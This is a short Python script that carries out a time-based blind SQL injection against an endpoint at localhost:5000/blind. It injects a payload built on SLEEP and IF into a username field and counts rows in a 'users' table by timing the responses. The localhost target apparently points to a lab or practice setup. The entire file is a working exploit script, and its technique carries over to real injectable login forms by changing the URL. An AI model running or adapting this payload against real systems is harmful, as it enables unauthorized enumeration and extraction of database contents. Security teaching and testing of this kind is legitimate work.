
import httpx
import time

# Target URL for the blind SQLi vulnerable endpoint
TARGET_URL = "http://localhost:5000/blind"

# Delay in seconds used to infer TRUE conditions in SQL payloads
DELAY = 10

# Function to determine the number of users in the database using time-based blind SQLi
def test_user_count():
    count = 1
    while True:
        # Crafting a SQL injection payload that causes a delay if user count is >= current value
        payload = f"' OR (SELECT IF((SELECT COUNT(*) FROM users) >= {count}, SLEEP({DELAY}), 0)) -- "

        # Send the POST request with the payload
        start = time.time()
        try:
            r = httpx.post(TARGET_URL, data={"username": payload}, timeout=DELAY + 5)
        except httpx.ReadTimeout:
            # If the request times out, it means the condition was TRUE and delay was triggered
            print(f"[+] Timeout at count = {count}: likely >= {count}")
            count += 1
            continue
        elapsed = time.time() - start

        # If response time is >= DELAY, the condition was TRUE
        print(f"[+] Testing count = {count}: {elapsed:.2f}s")
        if elapsed >= DELAY:
            count += 1
        else:
            # If no delay, we've found the exact number of users
            return count - 1

# Run the test and print the result
if __name__ == "__main__":
    total = test_user_count()
    print(f"[+] Total users in database: {total}")
